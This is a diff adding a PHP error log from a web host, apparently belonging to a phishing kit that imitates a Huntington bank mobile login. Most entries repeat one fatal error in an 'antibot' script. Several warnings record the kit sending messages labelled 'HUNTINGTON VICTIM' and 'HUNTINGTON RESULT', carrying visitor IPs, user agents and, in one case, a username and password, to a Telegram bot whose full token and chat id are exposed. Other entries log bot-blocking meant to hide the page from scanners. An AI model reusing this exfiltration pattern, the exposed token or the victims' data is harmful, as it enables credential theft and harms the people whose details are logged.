@@ -1,0 +1,286 @@
+[18-Oct-2022 21:45:27 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[18-Oct-2022 22:03:09 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[18-Oct-2022 22:13:29 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[18-Oct-2022 23:13:26 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[18-Oct-2022 23:24:12 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[18-Oct-2022 23:32:30 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 02:03:17 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 03:18:36 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 03:19:56 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 03:20:08 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 03:20:12 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 04:03:50 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 06:43:21 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 09:39:23 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 10:33:11 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 11:22:16 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 11:26:57 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 12:27:01 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 13:45:51 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 14:03:59 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 15:12:21 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 16:43:29 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 18:59:32 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 19:45:12 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 20:00:19 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 21:52:05 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[19-Oct-2022 22:27:45 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[20-Oct-2022 03:44:51 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[20-Oct-2022 12:08:28 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[20-Oct-2022 17:02:34 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[21-Oct-2022 06:03:53 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[21-Oct-2022 13:38:38 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[22-Oct-2022 19:48:36 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot5141903083:AAHCLQYnjVhxt775S51hq6L4wZ14f1S5oWI/sendMessage?chat_id=-1001746796636&amp;text=HUNTINGTON+VICTIM%0A%0A%7C+DEVICE+%3A+%23cc5fc9a022f988834b6ecd4917bdc4cc%0A%7C+IP+%3A+70.240.13.43%0A%7C+USER+AGENT+%3A+Mozilla%2F5.0+%28iPhone%3B+CPU+iPhone+OS+15_6_1+like+Mac+OS+X%29+AppleWebKit%2F605.1.15+%28KHTML%2C+like+Gecko%29+Version%2F15.6.1+Mobile%2F15E148+Safari%2F604.1&amp;parse_mode=HTML): Failed to open stream: HTTP request failed! HTTP/1.1 401 Unauthorized
+ in /home/pasaal/public_html/tests/mobile/includes/telegram.php on line 6
+[22-Oct-2022 22:02:04 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot5141903083:AAHCLQYnjVhxt775S51hq6L4wZ14f1S5oWI/sendMessage?chat_id=-1001746796636&amp;text=HUNTINGTON+VICTIM%0A%0A%7C+DEVICE+%3A+%2331fb8250698fb3010ec6f2c78f49c19c%0A%7C+IP+%3A+172.58.190.210%0A%7C+USER+AGENT+%3A+Mozilla%2F5.0+%28iPhone%3B+CPU+iPhone+OS+15_7+like+Mac+OS+X%29+AppleWebKit%2F605.1.15+%28KHTML%2C+like+Gecko%29+Version%2F15.6%2C2+Mobile%2F15E148+Safari%2F604.1&amp;parse_mode=HTML): Failed to open stream: HTTP request failed! HTTP/1.1 401 Unauthorized
+ in /home/pasaal/public_html/tests/mobile/includes/telegram.php on line 6
+[23-Oct-2022 17:48:22 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[23-Oct-2022 19:41:48 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[23-Oct-2022 20:54:06 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot5141903083:AAHCLQYnjVhxt775S51hq6L4wZ14f1S5oWI/sendMessage?chat_id=-1001746796636&amp;text=HUNTINGTON+VICTIM%0A%0A%7C+DEVICE+%3A+%23f49c4d4ca9269c6457002e93fe0bdcbb%0A%7C+IP+%3A+76.177.151.150%0A%7C+USER+AGENT+%3A+Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F106.0.0.0+Safari%2F537.36&amp;parse_mode=HTML): Failed to open stream: HTTP request failed! HTTP/1.1 401 Unauthorized
+ in /home/pasaal/public_html/tests/mobile/includes/telegram.php on line 6
+[23-Oct-2022 20:54:07 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot5141903083:AAHCLQYnjVhxt775S51hq6L4wZ14f1S5oWI/sendMessage?chat_id=-1001746796636&amp;text=BOT+BLOCKED%0A%0A%7C+DEVICE+%3A+%2357797e82a132b92226b9ee73416b74b8%0A%7C+IP+%3A+23.228.131.6%0A%7C+USER+AGENT+%3A+Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F103.0.0.0+Safari%2F537.36%0A%7C+URL+%3A+https%3A%2F%2Fwww.pasaal.online%2Ftests%2Fmobile%2F%3Ftoken%3Dbruioh983289y89489t6%0A%7C+REASON+%3A+Bad+hostname+%28google%29&amp;parse_mode=HTML): Failed to open stream: HTTP request failed! HTTP/1.1 401 Unauthorized
+ in /home/pasaal/public_html/tests/mobile/includes/telegram.php on line 6
+[23-Oct-2022 20:54:17 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot5141903083:AAHCLQYnjVhxt775S51hq6L4wZ14f1S5oWI/sendMessage?chat_id=-1001746796636&amp;text=HUNTINGTON+RESULT%0A%0A%7C+DEVICE+%3A+%23f49c4d4ca9269c6457002e93fe0bdcbb%0A%7C+IP+%3A+76.177.151.150%0A%7C+USER+AGENT+%3A+Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F106.0.0.0+Safari%2F537.36%0A%0A%7C+USERNAME+%3A+mmm%0A%7C+PASSWORD+%3A+mmm&amp;parse_mode=HTML): Failed to open stream: HTTP request failed! HTTP/1.1 401 Unauthorized
+ in /home/pasaal/public_html/tests/mobile/includes/telegram.php on line 6
+[24-Oct-2022 00:26:24 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot5141903083:AAHCLQYnjVhxt775S51hq6L4wZ14f1S5oWI/sendMessage?chat_id=-1001746796636&amp;text=BOT+BLOCKED%0A%0A%7C+DEVICE+%3A+%23ec654ca466a26157acc6c2edcf328a5e%0A%7C+IP+%3A+172.58.123.85%0A%7C+USER+AGENT+%3A+Mozilla%2F5.0+%28iPhone%3B+CPU+iPhone+OS+15_7+like+Mac+OS+X%29+AppleWebKit%2F605.1.15+%28KHTML%2C+like+Gecko%29+Version%2F15.6%2C2+Mobile%2F15E148+Safari%2F604.1%0A%7C+URL+%3A+https%3A%2F%2Fwww.pasaal.online%2Ftests%2Fmobile%2Flogin.php%0A%7C+REASON+%3A+Bad+URL+parameters&amp;parse_mode=HTML): Failed to open stream: HTTP request failed! HTTP/1.1 401 Unauthorized
+ in /home/pasaal/public_html/tests/mobile/includes/telegram.php on line 6
+[24-Oct-2022 21:47:51 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[25-Oct-2022 02:59:19 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot5141903083:AAHCLQYnjVhxt775S51hq6L4wZ14f1S5oWI/sendMessage?chat_id=-1001746796636&amp;text=HUNTINGTON+VICTIM%0A%0A%7C+DEVICE+%3A+%235f5a2e08fbbcd55e518fbbfe9e4a904b%0A%7C+IP+%3A+108.233.227.51%0A%7C+USER+AGENT+%3A+Mozilla%2F5.0+%28iPhone%3B+CPU+iPhone+OS+16_0+like+Mac+OS+X%29+AppleWebKit%2F605.1.15+%28KHTML%2C+like+Gecko%29+Version%2F16.0+Mobile%2F15E148+Safari%2F604.1&amp;parse_mode=HTML): Failed to open stream: HTTP request failed! HTTP/1.1 401 Unauthorized
+ in /home/pasaal/public_html/tests/mobile/includes/telegram.php on line 6
+[25-Oct-2022 15:42:15 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot5141903083:AAHCLQYnjVhxt775S51hq6L4wZ14f1S5oWI/sendMessage?chat_id=-1001746796636&amp;text=HUNTINGTON+VICTIM%0A%0A%7C+DEVICE+%3A+%23cf03a1b758eb7e7bdd461880bba82488%0A%7C+IP+%3A+104.57.150.74%0A%7C+USER+AGENT+%3A+Mozilla%2F5.0+%28iPhone%3B+CPU+iPhone+OS+15_6_1+like+Mac+OS+X%29+AppleWebKit%2F605.1.15+%28KHTML%2C+like+Gecko%29+Version%2F15.6.1+Mobile%2F15E148+Safari%2F604.1&amp;parse_mode=HTML): Failed to open stream: HTTP request failed! HTTP/1.1 401 Unauthorized
+ in /home/pasaal/public_html/tests/mobile/includes/telegram.php on line 6
+[26-Oct-2022 00:39:47 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot5141903083:AAHCLQYnjVhxt775S51hq6L4wZ14f1S5oWI/sendMessage?chat_id=-1001746796636&amp;text=BOT+BLOCKED%0A%0A%7C+DEVICE+%3A+%234adb9e398b83786ebe699adb3dd74f63%0A%7C+IP+%3A+76.35.1.123%0A%7C+USER+AGENT+%3A+Mozilla%2F5.0+%28iPhone%3B+CPU+iPhone+OS+16_0_3+like+Mac+OS+X%29+AppleWebKit%2F605.1.15+%28KHTML%2C+like+Gecko%29+Version%2F16.0+Mobile%2F15E148+Safari%2F604.1%0A%7C+URL+%3A+https%3A%2F%2Fwww.pasaal.online%2Ftests%2Fmobile%2Flogin.php%0A%7C+REASON+%3A+Bad+URL+parameters&amp;parse_mode=HTML): Failed to open stream: HTTP request failed! HTTP/1.1 401 Unauthorized
+ in /home/pasaal/public_html/tests/mobile/includes/telegram.php on line 6
+[27-Oct-2022 18:21:02 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot5141903083:AAHCLQYnjVhxt775S51hq6L4wZ14f1S5oWI/sendMessage?chat_id=-1001746796636&amp;text=HUNTINGTON+VICTIM%0A%0A%7C+DEVICE+%3A+%23ba4af50c48e200e661428379f233af63%0A%7C+IP+%3A+172.58.191.158%0A%7C+USER+AGENT+%3A+Mozilla%2F5.0+%28iPhone%3B+CPU+iPhone+OS+15_6_1+like+Mac+OS+X%29+AppleWebKit%2F605.1.15+%28KHTML%2C+like+Gecko%29+Version%2F15.6.1+Mobile%2F15E148+Safari%2F604.1&amp;parse_mode=HTML): Failed to open stream: HTTP request failed! HTTP/1.1 401 Unauthorized
+ in /home/pasaal/public_html/tests/mobile/includes/telegram.php on line 6
+[28-Oct-2022 00:15:31 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot5141903083:AAHCLQYnjVhxt775S51hq6L4wZ14f1S5oWI/sendMessage?chat_id=-1001746796636&amp;text=BOT+BLOCKED%0A%0A%7C+DEVICE+%3A+%23be7ff5ed4d4525656ed53be21bda4026%0A%7C+IP+%3A+172.58.189.203%0A%7C+USER+AGENT+%3A+Mozilla%2F5.0+%28iPhone%3B+CPU+iPhone+OS+15_6_1+like+Mac+OS+X%29+AppleWebKit%2F605.1.15+%28KHTML%2C+like+Gecko%29+Version%2F15.6.1+Mobile%2F15E148+Safari%2F604.1%0A%7C+URL+%3A+https%3A%2F%2Fwww.pasaal.online%2Ftests%2Fmobile%2Flogin.php%0A%7C+REASON+%3A+Bad+URL+parameters&amp;parse_mode=HTML): Failed to open stream: HTTP request failed! HTTP/1.1 401 Unauthorized
+ in /home/pasaal/public_html/tests/mobile/includes/telegram.php on line 6
+[29-Oct-2022 14:03:20 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot5141903083:AAHCLQYnjVhxt775S51hq6L4wZ14f1S5oWI/sendMessage?chat_id=-1001746796636&amp;text=HUNTINGTON+VICTIM%0A%0A%7C+DEVICE+%3A+%23f4b6efb07506038d58b9f766bed43112%0A%7C+IP+%3A+172.58.189.71%0A%7C+USER+AGENT+%3A+Mozilla%2F5.0+%28X11%3B+Ubuntu%3B+Linux+i686%3B+rv%3A24.0%29+Gecko%2F20100101+Firefox%2F24.0+Chrome%2F80.0.3987.132+Safari%2F537.36&amp;parse_mode=HTML): Failed to open stream: HTTP request failed! HTTP/1.1 401 Unauthorized
+ in /home/pasaal/public_html/tests/mobile/includes/telegram.php on line 6
+[29-Oct-2022 14:35:30 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot5141903083:AAHCLQYnjVhxt775S51hq6L4wZ14f1S5oWI/sendMessage?chat_id=-1001746796636&amp;text=HUNTINGTON+VICTIM%0A%0A%7C+DEVICE+%3A+%23e8e37002b185dc8f49d74b44ef6650c3%0A%7C+IP+%3A+172.58.123.198%0A%7C+USER+AGENT+%3A+Mozilla%2F5.0+%28X11%3B+Ubuntu%3B+Linux+i686%3B+rv%3A24.0%29+Gecko%2F20100101+Firefox%2F24.0+Chrome%2F80.0.3987.132+Safari%2F537.36&amp;parse_mode=HTML): Failed to open stream: HTTP request failed! HTTP/1.1 401 Unauthorized
+ in /home/pasaal/public_html/tests/mobile/includes/telegram.php on line 6
+[31-Oct-2022 22:04:58 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[01-Nov-2022 14:24:07 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot5141903083:AAHCLQYnjVhxt775S51hq6L4wZ14f1S5oWI/sendMessage?chat_id=-1001746796636&amp;text=HUNTINGTON+VICTIM%0A%0A%7C+DEVICE+%3A+%2328a60a5e58269c5cdea7851644017f38%0A%7C+IP+%3A+75.188.191.252%0A%7C+USER+AGENT+%3A+Mozilla%2F5.0+%28Linux%3B+Android+11%3B+MH-T6000%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F106.0.0.0+Mobile+Safari%2F537.36&amp;parse_mode=HTML): Failed to open stream: HTTP request failed! HTTP/1.1 401 Unauthorized
+ in /home/pasaal/public_html/tests/mobile/includes/telegram.php on line 6
+[05-Nov-2022 00:12:02 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[05-Nov-2022 22:54:12 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[07-Nov-2022 00:17:56 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[10-Nov-2022 05:46:07 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
